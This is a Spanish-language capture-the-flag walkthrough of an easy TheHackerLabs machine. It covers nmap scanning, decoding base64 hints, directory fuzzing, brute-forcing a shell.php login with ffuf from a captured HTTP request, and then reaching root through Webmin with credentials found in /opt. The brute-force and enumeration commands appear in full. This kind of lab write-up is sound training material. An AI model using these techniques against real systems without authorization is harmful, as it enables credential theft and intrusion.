Propiedades:
- OS: Linux
- Plataforma: TheHackerLabs
- Nivel: Easy
- Tags: #bruteforce #ffuf 

![](assets/Pasted%20image%2020251201202103.png)
## Reconocimiento

Comienzo con un ping para comprobar conectividad:
```bash
> ping -c 1 192.168.1.204
--------------------------------------------------------------------
PING 192.168.1.204 (192.168.1.204) 56(84) bytes of data.
64 bytes from 192.168.1.204: icmp_seq=1 ttl=64 time=5.20 ms

--- 192.168.1.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 5.198/5.198/5.198/0.000 m
```

Realizo un escaneo con nmap para descubrir puertos abiertos.
```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 192.168.1.204
----------------------------------------------------------
PORT      STATE SERVICE
22/tcp    open  ssh
8088/tcp  open  radan-http
10000/tcp open  snet-sensor-mgmt
```

Sobre los puertos abiertos realizo un segundo escaneo para descubrir versiones, servicios y correr un conjunto de scritpts predeterminados.
```bash
> sudo nmap -p 22,8088,10000 -Pn -sC -sV --min-rate 5000 -n 192.168.1.204 -oN target
---------------------------------------------------------------------------------------
PORT      STATE SERVICE               VERSION
22/tcp    open  ssh                   OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:9f:d1:71:81:33:e4:14:8a:78:1c:16:b4:a3:22:da (ECDSA)
|_  256 74:3f:23:c1:c2:68:1e:b5:72:44:8a:8c:02:e4:e5:02 (ED25519)
8088/tcp  open  http                  Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  ssl/snet-sensor-mgmt?
| ssl-cert: Subject: commonName=debian/countryName=US
| Subject Alternative Name: DNS:debian, DNS:localhost
| Not valid before: 2024-12-09T08:17:52
|_Not valid after:  2029-12-08T08:17:52
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 Document follows
|     Date: Tue, 2 Dec 2025 02:24:13 GMT
|     Server: MiniServ
|     Connection: close
|     Auth-type: auth-required=1
|     Set-Cookie: redirect=1; path=/; secure; httpOnly
|     Set-Cookie: testing=1; path=/; secure; httpOnly
|     X-Frame-Options: SAMEORIGIN
|     Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; frame-src 'self'; child-src 'self'
|     X-Content-Type-Options: nosniff
|     X-no-links: 1
|     Content-type: text/html; Charset=UTF-8
|     <!DOCTYPE HTML>
|     <html data-bgs="gainsboro" class="session_login">
|     <head>
|     <meta name="color-scheme" content="only light">
```

Encontramos los siguiente puertos abiertos:

- Puerto 22 SSH:  OpenSSH 9.2p1 Debian 2+deb12u3
- Puerto 8088 HTTP:  Apache/2.4.62
- Puerto 10000: ssl/snet-sensor-mgmt.

## Enumeración


##### **Puerto 8088 HTTP**

- Este puerto no es mas que una pagina en blanco, pero viendo su codigo fuente podemos ver 2 cadenas codificadas en `base64`

![](assets/Pasted%20image%2020251201203112.png)

Decodificamos las cadenas y este es el contenido:

```bash
> echo "Q2FtcGFuYSBzb2JyZSBjYW1wYW5hCgpZIHNvYnJlIGNhbXBhbmEgdW5hCgpBc8OzbWF0ZSBhIGxhIHZlbnRhbmEKClZlcsOhcyBlbCBuacOxbyBlbiBsYSBjdW5hCg==" | base64 -d; echo
Campana sobre campana

Y sobre campana una

Asómate a la ventana

Verás el niño en la cuna

> echo "Q2FtcGFuYSBDYW1wYW5hIENhTXBBTkEgQ2FNcGFOYQo=" | base64 -d; echo
Campana Campana CaMpANA CaMpaNa

```

- Campana puede ser algún posible usuario.

**Fuzzing**

Realizamos fuzzing utilizando `feroxbuster` para ver que otros recursos podíamos encontrar:

```bash
> feroxbuster -u http://192.168.1.204:8088/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,py,txt,xml,js -t 30
------------------------------------------------------------------------------------------------------------------------------------------

200      GET       44l       98w     1359c http://192.168.1.204:8088/shell.php
```

- Encontramos el recurso `shell.php` que al parecer es solo un login para acceder a una shell.

![](assets/Pasted%20image%2020251201204327.png)

##### **Puerto 10000**

- Aqui al parecer corre un servicio llamado `Webmin` que se utiliza para gestionar sistemas Unix/Windows de manera remota desde el navegador.

![](assets/Pasted%20image%2020251201210415.png)
## Explotación


Mi primer objetivo es el login form de `shell.php` al no tener ningún rate limiting o protección, pienso realizarle fuerza bruta utilizando `ffuf` por lo cual primero procedo a interceptar la petición con burpsuite y pasarla a un archivo llamado `login-bf`.

- Para el usuario utilice variantes de "Campana" que fue lo que encontramos en texto codificado en `base64` y la que me funciono fue "campana".
- Así es como queda el archivo de petición.
```http
POST /shell.php HTTP/1.1
Host: 192.168.1.204:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.1.204:8088/shell.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://192.168.1.204:8088
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=3g2m7a2tfkb6tumehkc48e9r6k
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=campana&password=FUZZPASS
```

Ya teniendo el archivo de petición ahora si podemos utilizar `ffuf` para realizar fuerza bruta:

- Encontramos las credenciales "campana:lovely"

```bash
> ffuf -request login-bf -request-proto http -mode pitchfork -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt:FUZZPASS -fr "Username.*password.*invalid"
-------------------------------------------------------------------------------------------------------------------------------------------------------
lovely                  [Status: 200, Size: 1616, Words: 704, Lines: 53, Duration: 5ms]
```

Al acceder vemos una especie de web-shell.

![](assets/Pasted%20image%2020251201210838.png)

Una vez dentro de esta shell intente entablarme una reverse-shell pero no tuve éxito. Por lo cual me dio por buscar directorios/archivos hasta que di con el directorio `/opt`.

- Aqui me encontré un archivo llamado `CMS Webmin.txt` el cual decidí inspeccionar:
- Encuentro credenciales para el webmin santaclaus:FelizNavidad2024

![](assets/Pasted%20image%2020251201211547.png)

Al acceder al `Webmin` me voy al apartado de ejecución de comandos para ver que usuario soy.

- Me encuentro que soy el usuario root.

![](assets/Pasted%20image%2020251201211831.png)


***PWNED***